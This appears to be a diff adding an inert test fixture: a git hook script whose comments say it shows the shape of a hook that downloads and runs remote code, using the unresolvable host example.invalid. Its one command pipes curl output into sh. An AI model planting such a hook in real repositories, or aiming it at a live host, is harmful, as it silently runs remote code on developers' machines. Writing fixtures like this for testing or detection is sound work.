@@ -1,0 +1,4 @@
+#!/bin/sh
+# INERT FIXTURE. Shape of a git hook that fetches and runs a script.
+# example.invalid is a reserved name (RFC 6761) that never resolves.
+curl -s https://example.invalid/hook | sh
